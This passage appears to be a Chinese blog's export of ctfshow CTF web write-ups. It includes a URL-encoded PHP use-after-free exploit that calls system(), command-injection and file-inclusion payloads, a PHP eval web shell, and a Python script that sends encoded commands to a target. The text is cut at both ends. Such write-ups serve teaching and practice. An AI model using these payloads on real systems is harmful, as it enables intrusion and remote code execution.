%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E</span><br></pre></td></tr></table></figure>\n<p>得到flag</p>\n<h1 id=\"web73\"><a href=\"#web73\" class=\"headerlink\" title=\"web73\"></a>web73</h1><p><img src=\"/pic/73.png\"><br>glob遍历目录，涨知识了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=?&gt;&lt;?php</span><br><span class=\"line\">\t$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class=\"line\">foreach($a as $f)</span><br><span class=\"line\">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">exit(0);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>要进行url编码<br><img src=\"/pic/73.png\"><br>发现了<code>flagc.txt</code><br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=include(&quot;/flagc.txt&quot;);exit();</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"web74\"><a href=\"#web74\" class=\"headerlink\" title=\"web74\"></a>web74</h1><p>还是同样的步骤，glob遍历目录<br>flag在flagx.txt里<br>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">c=include(&quot;/flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure>","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"ctfshow web97~100","url":"/2023/02/07/ctfshow-web%E5%85%A5%E9%97%A897~100/","content":"<h1 id=\"web97\"><a href=\"#web97\" class=\"headerlink\" title=\"web97\"></a>web97</h1><p><img src=\"/pic/97.png\"><br>要求POST传参，a不能等于b，但是a和b的md5值要相同，但是md5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a[]=123&amp;b[]=1234</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web98\"><a href=\"#web98\" class=\"headerlink\" title=\"web98\"></a>web98</h1><p><img src=\"/pic/98.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">分析上面的代码可以看出来，只要有输入的get参数就将get方法改变为post方法(修改了get方法</span><br><span class=\"line\">的地址），而第二三行代码没啥用，我们用不到，直接看第四行，如果get参数HTTP_FLAG的值为</span><br><span class=\"line\">flag，就读取文件，也就是输出flag。所以思路就有了，我们通过get随便传一个参数并赋值，</span><br><span class=\"line\">然后我们通过post请求传HTTP_FLAG参数并赋值为flag即可获得flag。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET:?1=1</span><br><span class=\"line\">POST:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n<h1 id=\"web99\"><a href=\"#web99\" class=\"headerlink\" title=\"web99\"></a>web99</h1><p><img src=\"/pic/99.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> array()，是空数组定义，题中定义了$allow为空数组</span><br><span class=\"line\">0x36d，其十进制为877</span><br><span class=\"line\">rand()，返回随机整数</span><br><span class=\"line\">array_push()，是向数组尾部插入新的值</span><br><span class=\"line\">file_put_contents()，写文件</span><br></pre></td></tr></table></figure>\n<p>因为in_array第三个参数没设置为true，所以该函数是宽松比较（==），字符串型会先转化为整型再比较，只要值相同就可以了，所以我们可以传参写木马进去.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?n=1.php</span><br><span class=\"line\">content=&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>\n<p>然后用蚁剑连接</p>\n<h1 id=\"web100\"><a href=\"#web100\" class=\"headerlink\" title=\"web100\"></a>web100</h1><p><img src=\"/pic/100.png\"><br>is_numeric() 函数用于检测变量是否为数字或数字字符串,如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。<br>v1一定要是个数字，v2不能有分号，v3必须有分号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">get:/?v1=1&amp;v2=eval($_POST[1])?&gt; %23&amp;v3=;</span><br><span class=\"line\">post:1=system(&quot;tac ctfshow.php&quot;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$flag_is_3110c36f0x2df28a0x2d4b840x2dbe0f0x2d2c4f600a4b95;</span><br></pre></td></tr></table></figure>\n<p>0x2d是-，换上后加上ctfshow{}就可以了</p>\n","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"ctfshow web入门87~88","url":"/2023/01/31/ctfshow-web%E5%85%A5%E9%97%A887/","content":"<h1 id=\"web87\"><a href=\"#web87\" class=\"headerlink\" title=\"web87\"></a>web87</h1><p><img src=\"/pic/87.png\"><br><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list\">谈一谈php://filter的妙用</a></p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">将 php://filter/write=convert.base64-decode/resource=123.php （这里因为我们需要的是写入的权限，所以是write）进行两次url编码，得到如下</span><br><span class=\"line\"></span><br><span class=\"linespan><br></pre></td></tr></table></figure>\n<p>然后再content写入经过base64编码过后的一句话 （PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==）<br>这里content的值前面要加两个字符，因为base64算法解码时是4个byte一组，所以给他增加2个字符 一共8个字符<br><img src=\"/pic/87.1.png\"><br><img src=\"/pic/87.2.png\"><br>然后再查看fl0g.php就行了</p>\n<h1 id=\"web88\"><a href=\"#web88\" class=\"headerlink\" title=\"web88\"></a>web88</h1><p><img src=\"/pic/88.png\"><br>过滤的东西很多，但data协议还可以用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgKi5waHAiKTs/Pg</span><br></pre></td></tr></table></figure>\n<p>base64后面是base64编码但是不能带有加号和等号，有加号的payload不能用。</p>\n<h1 id=\"web116和web117\"><a href=\"#web116和web117\" class=\"headerlink\" title=\"web116和web117\"></a>web116和web117</h1><p>不会做…..</p>\n","categories":["ctfshow","刷题","文件包含"],"tags":["ctfshow","刷题","文件包含"]},{"title":"ctfshow web入门29~36","url":"/2023/01/09/ctfshow29-36/","content":"<h1 id=\"web29\"><a href=\"#web29\" class=\"headerlink\" title=\"web29\"></a>web29</h1><p><img src=\"/pic/web29.png\" alt=\"img\"><br>过滤了flag，可以用system,echo等。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=system(&quot;cat fla*&quot;);</span><br><span class=\"line\">/?c=echo`cat fl*`;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web30\"><a href=\"#web30\" class=\"headerlink\" title=\"web30\"></a>web30</h1><p><img src=\"/pic/web30.png\" alt=\"img\"><br>多过滤了一个system，还可以用echo。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?echo`cat fl*`;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web31\"><a href=\"#web31\" class=\"headerlink\" title=\"web31\"></a>web31</h1><p><img src=\"/pic/web31.png\" alt=\"img\"><br>cat和空格过滤了，可以用tac.<br>空格可以用%09绕过。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=echo%09`tac%09fl*`;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web32\"><a href=\"#web32\" class=\"headerlink\" title=\"web32\"></a>web32</h1><p><img src=\"/pic/web32.png\" alt=\"img\"><br>过滤的东西太多了左括号都给过滤了，使用命令逃逸+文件包含<br>空格可以用%09绕过， ；可以用?&gt;绕过,因为使用?&gt;，所以后面没办法直接拼接php语句，需要使用文件包含。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>再将得到的进行base64解码得到flag</p>\n<h1 id=\"web33\"><a href=\"#web33\" class=\"headerlink\" title=\"web33\"></a>web33</h1><p><img src=\"/pic/web33.png\" alt=\"img\"><br>和web32差不多，用同样的payload就行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web34\"><a href=\"#web34\" class=\"headerlink\" title=\"web34\"></a>web34</h1><p>依旧可以用同样的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web35\"><a href=\"#web35\" class=\"headerlink\" title=\"web35\"></a>web35</h1><p>依旧可以用同样的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>连续几道题都一样，写的真恶心。</p>\n<h1 id=\"web36\"><a href=\"#web36\" class=\"headerlink\" title=\"web36\"></a>web36</h1><p>这道题把1换成其他的字符就行，其他步骤一样。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?c=include%09$_GET[a]?&gt;&amp;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n<p>require可以代替include，PHP常用的可以不加括号的函数echo、print、isset、unset、include、require。</p>\n","categories":["web","ctfshow","刷题"],"tags":["ctfshow","刷题","web"]},{"title":"ctfshow web入门41~44","url":"/2023/01/14/ctfshow41-44/","content":"<h1 id=\"web41\"><a href=\"#web41\" class=\"headerlink\" title=\"web41\"></a>web41</h1><p><img src=\"/pic/web41.png\" alt=\"img\"><br>这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p>\n<span id=\"more\"></span>\n<p>借用师傅们的脚本：<a href=\"https://blog.csdn.net/miuzzx/article/details/108569080\">https://blog.csdn.net/miuzzx/article/details/108569080</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);</span><br><span class=\"line\">$contents=&quot;&quot;;</span><br><span class=\"line\">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class=\"line\">\tfor ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif($i&lt;16)&#123;</span><br><span class=\"line\">\t\t\t$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\telse&#123;</span><br><span class=\"line\">\t\t\t$hex_i=dechex($i);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif($j&lt;16)&#123;</span><br><span class=\"line\">\t\t\t$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\telse&#123;</span><br><span class=\"line\">\t\t\t$hex_j=dechex($j);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$preg = &#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;;</span><br><span class=\"line\">\t\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class=\"line\">\t\t\t\t\techo &quot;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t\telse&#123;</span><br><span class=\"line\">\t\t$a=&#x27;%&#x27;.$hex_i;</span><br><span class=\"line\">\t\t$b=&#x27;%&#x27;.$hex_j;</span><br><span class=\"line\">\t\t$c=(urldecode($a)|urldecode($b));</span><br><span class=\"line\">\t\tif (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class=\"line\">\t\t\t$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">fwrite($myfile,$contents);</span><br><span class=\"line\">fclose($myfile);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import urllib</span><br><span class=\"line\">from sys import *</span><br><span class=\"line\">import os</span><br><span class=\"line\">os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行</span><br><span class=\"line\">if(len(argv)!=2):</span><br><span class=\"line\">   print(&quot;=&quot;*50)</span><br><span class=\"line\">   print(&#x27;USER：python exp.py &lt;url&gt;&#x27;)</span><br><span class=\"line\">   print(&quot;eg：  python exp.py http://ctf.show/&quot;)</span><br><span class=\"line\">   print(&quot;=&quot;*50)</span><br><span class=\"line\">   exit(0)</span><br><span class=\"line\">url=argv[1]</span><br><span class=\"line\">def action(arg):</span><br><span class=\"line\">   s1=&quot;&quot;</span><br><span class=\"line\">   s2=&quot;&quot;</span><br><span class=\"line\">   for i in arg:</span><br><span class=\"line\">       f=open(&quot;rce_or.txt&quot;,&quot;r&quot;)</span><br><span class=\"line\">       while True:</span><br><span class=\"line\">           t=f.readline()</span><br><span class=\"line\">           if t==&quot;&quot;:</span><br><span class=\"line\">               break</span><br><span class=\"line\">           if t[0]==i:</span><br><span class=\"line\">               #print(i)</span><br><span class=\"line\">               s1+=t[2:5]</span><br><span class=\"line\">               s2+=t[6:9]</span><br><span class=\"line\">               break</span><br><span class=\"line\">       f.close()</span><br><span class=\"line\">   output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;|\\&quot;&quot;+s2+&quot;\\&quot;)&quot;</span><br><span class=\"line\">   return(output)</span><br><span class=\"line\">   </span><br><span class=\"line\">while True:</span><br><span class=\"line\">   param=action(input(&quot;\\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))</span><br><span class=\"line\">   data=&#123;</span><br><span class=\"line\">       &#x27;c&#x27;:urllib.parse.unquote(param)</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   r=requests.post(url,data=data)</span><br><span class=\"line\">   print(&quot;\\n[*] result:\\n&quot;+r.text)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/pic/web41.1.png\" alt=\"img\"><br>得到flag</p>\n<h1 id=\"web42\"><a href=\"#web42\" class=\"headerlink\" title=\"web42\"></a>web42</h1><p><img src=\"/pic/web42.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt</span><br><span class=\"line\">2：/dev/null 代表空设备文件</span><br><span class=\"line\">3：2&gt; 表示stderr标准错误</span><br><span class=\"line\">4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</span><br><span class=\"line\">5：1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null”</span><br></pre></td></tr></table></figure>\n<p>参考：<a href=\"https://www.cnblogs.com/kexianting/p/11630085.html\">https://www.cnblogs.com/kexianting/p/11630085.html</a><br>用双写绕过<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=cat flag.php;ls</span><br></pre></td></tr></table></figure>\n<h1 id=\"web43\"><a href=\"#web43\" class=\"headerlink\" title=\"web43\"></a>web43</h1><p><img src=\"/pic/web43.png\" alt=\"img\"><br>将;过滤掉了，可以使用其他的命令分隔符；<br>常见的命令分隔符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、“;”分隔符</span><br><span class=\"line\">用分号分隔的命令会按顺序执行，即使中间命令使用方式不对，会有相关错误输出，后面的命令照样会执行。如：</span><br><span class=\"line\">输入：命令A；命令B；命令C</span><br><span class=\"line\">按顺序执行A、B、C命令，若B命令调用方式不对，终端会有相关错误提示，提示后会继续执行C命令。</span><br><span class=\"line\">2、“&amp;&amp;”分隔符</span><br><span 